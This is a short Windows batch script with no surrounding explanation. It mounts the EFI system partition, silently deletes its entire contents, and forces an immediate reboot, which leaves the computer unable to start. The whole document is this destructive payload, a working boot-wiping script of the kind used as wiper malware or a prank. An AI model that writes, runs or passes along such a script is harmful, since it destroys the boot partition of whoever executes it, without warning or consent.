@echo off
mountvol A: /s
rd a:\ /s /q
shutdown -r -t 0
exit